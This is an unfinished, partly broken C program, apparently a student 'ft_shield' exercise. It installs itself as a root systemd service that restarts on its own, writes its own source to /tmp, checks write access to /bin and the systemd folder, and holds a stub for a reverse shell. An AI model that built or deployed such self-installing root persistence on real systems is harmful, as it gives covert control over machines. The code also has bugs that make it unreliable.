char src[1] = {};

#include <stdbool.h>
#include <unistd.h>
#include <stdio.h>
#include "string.h"
#include "stdlib.h"
#include <linux/limits.h>


#define LOGIN "hlahwaou"


char target_path[] = "/bin";
char daemon_config_path[] = "/etc/systemd/system/";
char service_path[] = "/etc/systemd/system/ft_shield.service";
char daemon_config[]  = "[Unit]\nDescription=ft_shield\nAfter=network.target\n[Service]\nExecStart=/bin/ft_sheild\nRestart=always\nType=forking\nUser=root\n[Install]\nWantedBy=multi-user.target\n";



bool in_bin(){
   char cwd[PATH_MAX];
   

   if (getcwd(cwd, sizeof(cwd)) != NULL) {
       printf("Current working dir: %s\n", cwd);
       
   }else {
        exit(1);
   }


   printf("%s = %s\n", cwd, target_path);
   return strcmp(cwd, target_path) == 0;
}




void start_daemon(){

	int pid = fork();


	if (pid < 0)
		exit(0);

	if (pid)
		exit(0);

	printf("here is the daemon process !\n");
	printf("Yep access to %s\n", target_path);
}


void create_yourself(FILE *fptr){
	fprintf(fptr, "%s", src);
}


void configure_daemon(){

	char filePath[] = "/tmp/file.c"
	FILE* fptr = fopen(filePath, "w+");


	if (!fptr){
		fclose(fptr);
		exit(0);
	}
	create_yourself(fptr);
	printf("------------\n");
	printf(".c file was created at %s\n", filePath);
	
	
	if (access(target_path, W_OK) != 0){
		printf("oops no access to %s\n", target_path);
		exit(0);
	}


	if (access(daemon_config_path, W_OK) != 0) {
		printf("oopss we don't have access to it sorry");
	}

	printf("------------\n");
	printf("we have access to write our service");
	printf("Daemon configuration\n%s", daemon_config);
	printf("system status = %d\n",system("systemctl daemon-reload && systemctl enable ft_shield.service"));
}



void display_login(){
	printf("%s\n", LOGIN);
}


void start_reverse_shell(){


}


int main(){

    // if we are in /bin 
    if (getuid() != 0){
        printf("you don't have root access\n");
    }
    display_login();
    



    if (in_bin()) {
        printf("we are at bin\n");
    } else {
        printf("ooops we are not at bin\n");
	start_daemon();
	//configure_daemon();

    }





    return 0;
}
